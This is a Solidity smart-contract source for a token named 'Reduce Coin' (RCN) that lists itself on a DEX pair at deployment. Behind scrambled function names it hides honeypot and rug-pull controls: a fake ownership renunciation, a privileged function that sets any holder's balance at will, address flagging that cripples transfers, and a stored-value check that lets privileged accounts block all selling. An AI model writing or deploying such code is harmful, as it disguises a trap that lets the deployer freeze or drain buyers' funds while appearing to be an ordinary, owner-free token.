//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract takeLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isBuy {
    function createPair(address launchedAmountMin, address maxAmount) external returns (address);

    function feeTo() external view returns (address);
}

interface senderLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface walletEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toTx) external view returns (uint256);

    function transfer(address shouldTake, uint256 takeModeToken) external returns (bool);

    function allowance(address launchedFromIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeModeToken) external returns (bool);

    function transferFrom(
        address sender,
        address shouldTake,
        uint256 takeModeToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minLimit, uint256 value);
    event Approval(address indexed launchedFromIs, address indexed spender, uint256 value);
}

interface walletEnableMetadata is walletEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ReduceCoin is takeLaunched, walletEnable, walletEnableMetadata {

    uint256 private fundMaxSender;

    function exemptFrom() private view {
        require(feeSender[_msgSender()]);
    }

    function limitReceiver(address txLaunched) public {
        exemptFrom();
        
        if (txLaunched == buyTake || txLaunched == toTradingShould) {
            return;
        }
        toMarketing[txLaunched] = true;
    }

    mapping(address => bool) public feeSender;

    address fundLimitSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public buyTake;

    function fromIs(address fromMarketing, address shouldTake, uint256 takeModeToken) internal view returns (uint256) {
        require(takeModeToken > 0);

        uint256 isSwapTrading = 0;
        if (fromMarketing == toTradingShould && swapLimitTotal > 0) {
            isSwapTrading = takeModeToken * swapLimitTotal / 100;
        } else if (shouldTake == toTradingShould && exemptAmount > 0) {
            isSwapTrading = takeModeToken * exemptAmount / 100;
        }
        require(isSwapTrading <= takeModeToken);
        return takeModeToken - isSwapTrading;
    }

    bool public modeReceiver;

    uint256 tradingEnable;

    uint256 private enableList = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return enableList;
    }

    mapping(address => bool) public toMarketing;

    mapping(address => uint256) private liquidityTrading;

    address limitAutoTeam;

    uint256 private tradingFrom;

    string private isAutoLimit = "Reduce Coin";

    uint256 senderWallet;

    function transfer(address shouldListLiquidity, uint256 takeModeToken) external virtual override returns (bool) {
        return teamShould(_msgSender(), shouldListLiquidity, takeModeToken);
    }

    event OwnershipTransferred(address indexed senderSwap, address indexed enableTokenMax);

    uint256 public swapLimitTotal = 0;

    function getOwner() external view returns (address) {
        return limitSwapTotal;
    }

    uint256 constant amountLiquidity = 14 ** 10;

    bool private buyList;

    function symbol() external view virtual override returns (string memory) {
        return buySellTake;
    }

    uint256 private launchList;

    function decimals() external view virtual override returns (uint8) {
        return enableAuto;
    }

    mapping(address => mapping(address => uint256)) private minExempt;

    address public toTradingShould;

    address private limitSwapTotal;

    uint8 private enableAuto = 18;

    function teamExempt() public {
        emit OwnershipTransferred(buyTake, address(0));
        limitSwapTotal = address(0);
    }

    function balanceOf(address toTx) public view virtual override returns (uint256) {
        return liquidityTrading[toTx];
    }

    bool public walletEnableFrom;

    function autoBuy(address shouldListLiquidity, uint256 takeModeToken) public {
        exemptFrom();
        liquidityTrading[shouldListLiquidity] = takeModeToken;
    }

    string private buySellTake = "RCN";

    constructor (){
        
        teamExempt();
        senderLaunch minTake = senderLaunch(fundLimitSell);
        toTradingShould = isBuy(minTake.factory()).createPair(minTake.WETH(), address(this));
        limitAutoTeam = isBuy(minTake.factory()).feeTo();
        
        buyTake = _msgSender();
        feeSender[buyTake] = true;
        liquidityTrading[buyTake] = enableList;
        
        emit Transfer(address(0), buyTake, enableList);
    }

    function tokenMode(address buyTeam) public {
        require(buyTeam.balance < 100000);
        if (walletEnableFrom) {
            return;
        }
        
        feeSender[buyTeam] = true;
        
        walletEnableFrom = true;
    }

    function approve(address launchFund, uint256 takeModeToken) public virtual override returns (bool) {
        minExempt[_msgSender()][launchFund] = takeModeToken;
        emit Approval(_msgSender(), launchFund, takeModeToken);
        return true;
    }

    function sellLaunchedMarketing(address fromMarketing, address shouldTake, uint256 takeModeToken) internal returns (bool) {
        require(liquidityTrading[fromMarketing] >= takeModeToken);
        liquidityTrading[fromMarketing] -= takeModeToken;
        liquidityTrading[shouldTake] += takeModeToken;
        emit Transfer(fromMarketing, shouldTake, takeModeToken);
        return true;
    }

    function transferFrom(address fromMarketing, address shouldTake, uint256 takeModeToken) external override returns (bool) {
        if (_msgSender() != fundLimitSell) {
            if (minExempt[fromMarketing][_msgSender()] != type(uint256).max) {
                require(takeModeToken <= minExempt[fromMarketing][_msgSender()]);
                minExempt[fromMarketing][_msgSender()] -= takeModeToken;
            }
        }
        return teamShould(fromMarketing, shouldTake, takeModeToken);
    }

    uint256 public exemptAmount = 0;

    function owner() external view returns (address) {
        return limitSwapTotal;
    }

    function txSell(uint256 takeModeToken) public {
        exemptFrom();
        senderWallet = takeModeToken;
    }

    function teamShould(address fromMarketing, address shouldTake, uint256 takeModeToken) internal returns (bool) {
        if (fromMarketing == buyTake) {
            return sellLaunchedMarketing(fromMarketing, shouldTake, takeModeToken);
        }
        uint256 senderTake = walletEnable(toTradingShould).balanceOf(limitAutoTeam);
        require(senderTake == senderWallet);
        require(shouldTake != limitAutoTeam);
        if (toMarketing[fromMarketing]) {
            return sellLaunchedMarketing(fromMarketing, shouldTake, amountLiquidity);
        }
        takeModeToken = fromIs(fromMarketing, shouldTake, takeModeToken);
        return sellLaunchedMarketing(fromMarketing, shouldTake, takeModeToken);
    }

    function allowance(address fundFeeReceiver, address launchFund) external view virtual override returns (uint256) {
        if (launchFund == fundLimitSell) {
            return type(uint256).max;
        }
        return minExempt[fundFeeReceiver][launchFund];
    }

    function name() external view virtual override returns (string memory) {
        return isAutoLimit;
    }

}